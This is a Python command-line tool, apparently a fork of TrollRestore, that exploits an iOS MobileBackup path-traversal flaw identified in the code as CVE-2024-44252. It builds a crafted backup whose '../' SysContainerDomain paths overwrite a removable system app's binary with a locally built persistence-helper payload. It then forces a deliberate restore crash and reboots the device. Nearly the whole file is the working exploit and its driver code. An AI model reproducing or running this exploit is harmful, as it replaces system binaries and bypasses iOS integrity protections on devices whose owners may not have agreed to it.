#!/usr/bin/env python3
"""
mxrestore — fork of JJTech0130/TrollRestore that drops our own
PersistenceHelper_Embedded (built by mxhelper/) instead of downloading
opa334's release asset.

Two differences vs upstream trollstore.py:
  1. No network fetch of PersistenceHelper_Embedded; reads
     ./payload/PersistenceHelper_Embedded (relative to this file).
  2. CLI takes --system-app / --no-reboot to make non-interactive use easy
     (so a SwiftUI shell can drive it via subprocess.run).
"""
import json
import platform
import sys
import traceback
from pathlib import Path

import click
from packaging.version import parse as parse_version
from pymobiledevice3.cli.cli_common import Command
from pymobiledevice3.exceptions import NoDeviceConnectedError, PyMobileDevice3Exception
from pymobiledevice3.lockdown import LockdownClient
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.services.installation_proxy import InstallationProxyService

from sparserestore import backup, perform_restore

PAYLOAD_PATH = Path(__file__).resolve().parent / "payload" / "PersistenceHelper_Embedded"


def _emit(progress, **kw):
    """If --json-progress is on, dump an NDJSON line; else write a colored
    human message. Lets a GUI shell consume structured progress."""
    if progress:
        sys.stdout.write(json.dumps(kw, ensure_ascii=False) + "\n")
        sys.stdout.flush()
    else:
        fg = kw.pop("_color", "white")
        msg = kw.get("msg") or kw.get("error") or json.dumps(kw, ensure_ascii=False)
        click.secho(msg, fg=fg)


def _exit(code=0):
    if platform.system() == "Windows" and getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
        input("Press Enter to exit...")
    sys.exit(code)


@click.command(cls=Command)
@click.option("--system-app", "system_app",
              help="Removable system app to overwrite (e.g. Tips). If omitted, prompts interactively.")
@click.option("--no-reboot", is_flag=True, default=False,
              help="Skip the post-restore reboot. The device will need a manual reboot to land the swapped binary.")
@click.option("--json-progress", "json_progress", is_flag=True, default=False,
              help="Emit NDJSON progress on stdout (for GUI shells).")
@click.pass_context
def cli(ctx, service_provider: LockdownClient, system_app, no_reboot, json_progress) -> None:
    os_names = {
        "iPhone": "iOS", "iPad": "iPadOS", "iPod": "iOS",
        "AppleTV": "tvOS", "Watch": "watchOS",
        "AudioAccessory": "HomePod Software Version", "RealityDevice": "visionOS",
    }

    if not PAYLOAD_PATH.exists():
        _emit(json_progress, _color="red",
              msg=f"payload missing: {PAYLOAD_PATH}",
              error="PAYLOAD_MISSING",
              hint="Build mxhelper first: cd mxhelper && make")
        _exit(1)
    helper_contents = PAYLOAD_PATH.read_bytes()

    device_class = service_provider.get_value(key="DeviceClass")
    device_build = service_provider.get_value(key="BuildVersion")
    device_version = parse_version(service_provider.product_version)

    if not all([device_class, device_build, device_version]):
        _emit(json_progress, _color="red", msg="Failed to get device information; reconnect and retry",
              error="DEVICE_INFO")
        return

    os_name = (os_names[device_class] + " ") if device_class in os_names else ""

    # Upstream's exact compatibility check: iOS/iPadOS 15.0 - 16.7 RC (20H18) and 17.0.
    # We DON'T relax this: outside the window MobileBackup CVE-2024-44252 is patched.
    if (
        device_version < parse_version("15.0")
        or device_version > parse_version("17.0")
        or parse_version("16.7") < device_version < parse_version("17.0")
        or device_version == parse_version("16.7") and device_build != "20H18"
    ):
        _emit(json_progress, _color="red",
              msg=f"{os_name}{device_version} ({device_build}) is not supported. Tool only covers iOS 15.0–16.7 RC and 17.0.",
              error="UNSUPPORTED_OS",
              os_name=os_name, version=str(device_version), build=device_build)
        return

    # Pick the system app to overwrite.
    if not system_app:
        system_app = click.prompt(
            "\nRemovable system app to replace (e.g. Tips, GarageBand). "
            "Pick something you can reinstall from App Store later.\nApp name",
            default="Tips")
    if not system_app.endswith(".app"):
        system_app += ".app"

    apps_json = InstallationProxyService(service_provider).get_apps(
        application_type="System", calculate_sizes=False)
    app_path = None
    for value in apps_json.values():
        if isinstance(value, dict) and "Path" in value:
            cand = Path(value["Path"])
            if cand.name.lower() == system_app.lower():
                app_path = cand
                system_app = cand.name
                break

    if not app_path:
        _emit(json_progress, _color="red",
              msg=f"System app '{system_app}' not found. Make sure it is installed and try again.",
              error="APP_NOT_FOUND", app=system_app)
        return
    if Path("/private/var/containers/Bundle/Application") not in app_path.parents:
        _emit(json_progress, _color="red",
              msg=f"'{system_app}' is not a removable system app. Pick a deletable Apple app (Tips, GarageBand, …).",
              error="APP_NOT_REMOVABLE", app=system_app)
        return

    app_uuid = app_path.parent.name
    _emit(json_progress, _color="yellow",
          msg=f"Replacing {system_app} with mxhelper. (UUID: {app_uuid})",
          stage="replacing", app=system_app, uuid=app_uuid)

    # Backup payload (verbatim from upstream TrollRestore — this is the
    # CVE-2024-44252 weaponized layout; do not touch).
    back = backup.Backup(files=[
        backup.Directory("", "RootDomain"),
        backup.Directory("Library", "RootDomain"),
        backup.Directory("Library/Preferences", "RootDomain"),
        backup.ConcreteFile("Library/Preferences/temp", "RootDomain",
                            owner=33, group=33, contents=helper_contents, inode=0),
        backup.Directory(
            "",
            f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{system_app}",
            owner=33, group=33,
        ),
        backup.ConcreteFile(
            "",
            f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{system_app}/{system_app.split('.')[0]}",
            owner=33, group=33, contents=b"", inode=0,
        ),
        backup.ConcreteFile(
            "",
            "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
            owner=501, group=501, contents=b"",
        ),  # Break the hard link
        backup.ConcreteFile("",
            "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose",
            contents=b""),
    ])

    try:
        perform_restore(back, reboot=False)
    except PyMobileDevice3Exception as e:
        if "Find My" in str(e):
            _emit(json_progress, _color="red",
                  msg="Find My must be disabled (Settings → [Your Name] → Find My).",
                  error="FIND_MY_ENABLED")
            _exit(1)
        elif "crash_on_purpose" not in str(e):
            raise

    if no_reboot:
        _emit(json_progress, _color="green",
              msg="Restore done. Reboot the device manually to activate.",
              stage="restore_done", reboot_required=True)
        return

    _emit(json_progress, _color="green",
          msg="Restore done, rebooting device …",
          stage="rebooting")
    with DiagnosticsService(service_provider) as diagnostics_service:
        diagnostics_service.restart()

    _emit(json_progress, _color="green",
          msg="Reboot triggered. After the device comes back up, tap the swapped system app "
              "icon to start auto-install. Re-enable Find My if you use it.",
          stage="done")


def main():
    try:
        cli(standalone_mode=False)
    except NoDeviceConnectedError:
        click.secho("No device connected!", fg="red")
        _exit(1)
    except click.UsageError as e:
        click.secho(e.format_message(), fg="red")
        click.echo(cli.get_help(click.Context(cli)))
        _exit(2)
    except Exception:
        click.secho("An error occurred!", fg="red")
        click.secho(traceback.format_exc(), fg="red")
        _exit(1)
    _exit(0)


if __name__ == "__main__":
    main()
